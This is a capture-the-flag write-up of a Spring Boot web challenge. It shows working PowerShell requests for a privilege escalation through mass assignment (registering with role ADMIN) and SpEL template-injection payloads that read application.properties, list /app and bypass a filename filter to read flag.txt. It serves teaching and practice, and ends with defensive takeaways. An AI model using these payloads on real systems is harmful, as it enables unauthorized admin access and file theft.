# Sweet Shop Writeup

## Challenge

- Name: Sweet Shop
- Target: `http://chals1.apoorvctf.xyz:7001`

## Goal

Recover the real flag without relying on the obvious decoys exposed by the application.

## Initial Recon

The landing page looked like a normal candy shop app with register and login functionality.

Important observations from the page source and exposed endpoints:

- The HTML source contained a fake flag:
  - `apoorvctf{html_s0urc3_1s_n0t_th3_w4y}`
- The page JavaScript showed the frontend API routes:
  - `POST /api/register`
  - `POST /api/login`
  - `GET /api/products`
- The footer hinted that the app used Spring Boot, H2, and Actuator.

Actuator was exposed and gave useful metadata:

- `/actuator/mappings`
- `/actuator/env`
- `/actuator/info`
- `/actuator/beans`

From those endpoints, the custom routes were identified:

- `GET /api/admin/flag`
- `GET /api/admin/users`
- `GET /api/admin/debug/config`
- `POST /api/admin/preview`

At this point it was already clear that the challenge had multiple layers and multiple decoys.

## Decoys Found

Several values looked like flags but were intentionally wrong:

- HTML source decoy:
  - `apoorvctf{html_s0urc3_1s_n0t_th3_w4y}`
- Admin debug config decoy:
  - `apoorvctf{d3bug_c0nf1g_l34k_but_st1ll_wr0ng}`
- Admin panel flag decoy:
  - `apoorvctf{y0u_f0und_th3_4dm1n_p4n3l}`

The real flag was deeper.

## Key Vulnerability 1: Mass Assignment in Registration

The first real vulnerability was in `POST /api/register`.

Using PowerShell's native HTTP client instead of `curl`, the endpoint accepted arbitrary fields from the JSON body. That included `role`.

This request created an admin user:

```powershell
$body = @{
  username = 'massadmin1'
  password = 'masspass1'
  email    = 'mass1@example.com'
  role     = 'ADMIN'
} | ConvertTo-Json

Invoke-RestMethod -Uri 'http://chals1.apoorvctf.xyz:7001/api/register' `
  -Method Post `
  -ContentType 'application/json' `
  -Body $body
```

Response:

```json
{"role":"ADMIN","message":"Registration successful","username":"massadmin1"}
```

Then logging in returned an admin token:

```powershell
$login = @{
  username = 'massadmin1'
  password = 'masspass1'
} | ConvertTo-Json

Invoke-RestMethod -Uri 'http://chals1.apoorvctf.xyz:7001/api/login' `
  -Method Post `
  -ContentType 'application/json' `
  -Body $login
```

Response:

```json
{"role":"ADMIN","apiToken":"f5837a6a-431b-40a3-8740-8552d832510f","message":"Login successful","username":"massadmin1"}
```

This confirmed that registration blindly trusted client-controlled fields.

## Key Vulnerability 2: Server-Side Template Injection

With the forged admin token, the admin endpoints became accessible.

The most important one was:

- `POST /api/admin/preview`

That endpoint rendered attacker-controlled template input.

This payload proved SSTI immediately:

```powershell
$headers = @{ 'X-Api-Token'='f5837a6a-431b-40a3-8740-8552d832510f' }
$body = @{ template='${7*7}' } | ConvertTo-Json

Invoke-RestMethod -Uri 'http://chals1.apoorvctf.xyz:7001/api/admin/preview' `
  -Method Post `
  -ContentType 'application/json' `
  -Headers $headers `
  -Body $body
```

Response:

```json
{"note":"This is a preview of the notification template","preview":"49"}
```

That meant arbitrary SpEL-style evaluation was possible.

## Recovering the Real Flag Path

The next step was to use SSTI to read configuration from the classpath.

This payload read `application.properties` directly:

```powershell
$payload = '${new java.util.Scanner(T(java.lang.Thread).currentThread().getContextClassLoader().getResourceAsStream(''application.properties'')).useDelimiter(''\\A'').next()}'
$body = @{ template=$payload } | ConvertTo-Json

Invoke-RestMethod -Uri 'http://chals1.apoorvctf.xyz:7001/api/admin/preview' `
  -Method Post `
  -ContentType 'application/json' `
  -Headers $headers `
  -Body $body
```

Important line recovered from the config:

```properties
sweetshop.flag.path=/app/flag.txt
```

So the real flag was stored in `/app/flag.txt`.

## Beating the Filter on `flag.txt`

Direct reads of `/app/flag.txt` triggered filtering and returned errors or `403`.

The bypass was to avoid naming the file directly.

First, list the files inside `/app`:

```powershell
$payload = '${T(java.util.Arrays).toString(new java.io.File(''/app'').list())}'
$body = @{ template=$payload } | ConvertTo-Json

Invoke-RestMethod -Uri 'http://chals1.apoorvctf.xyz:7001/api/admin/preview' `
  -Method Post `
  -ContentType 'application/json' `
  -Headers $headers `
  -Body $body
```

Response:

```json
{"note":"This is a preview of the notification template","preview":"[flag.txt, app.jar]"}
```

Now the first entry in `/app` could be referenced by index instead of by literal filename.

## Final Payload

This payload read the first file in `/app`, which was `flag.txt`:

```powershell
$payload = '${new java.io.BufferedReader(new java.io.FileReader(new java.io.File(''/app'', new java.io.File(''/app'').list()[0]))).readLine()}'
$body = @{ template=$payload } | ConvertTo-Json

Invoke-RestMethod -Uri 'http://chals1.apoorvctf.xyz:7001/api/admin/preview' `
  -Method Post `
  -ContentType 'application/json' `
  -Headers $headers `
  -Body $body
```

Response:

```json
{"note":"This is a preview of the notification template","preview":"apoorvctf{sp3l_1nj3ct10n_sw33t_v1ct0ry_2026}"}
```

## Real Flag

```text
apoorvctf{sp3l_1nj3ct10n_sw33t_v1ct0ry_2026}
```

## Short Version

The challenge chain was:

1. Exposed Actuator endpoints revealed hidden admin functionality.
2. `POST /api/register` had mass assignment and allowed `role: ADMIN`.
3. The forged admin account returned a valid admin `apiToken` on login.
4. `POST /api/admin/preview` was vulnerable to SSTI.
5. SSTI was used to read `application.properties` and find the real flag path.
6. A directory-listing trick bypassed filtering on the literal filename.
7. The real flag was read from `/app/flag.txt`.

## Takeaways

- Never bind user-controlled JSON directly to privileged model fields.
- Never expose Actuator endpoints broadly in production.
- Never render attacker-controlled template content.
- Decoy flags are common in CTF web challenges; verify every candidate.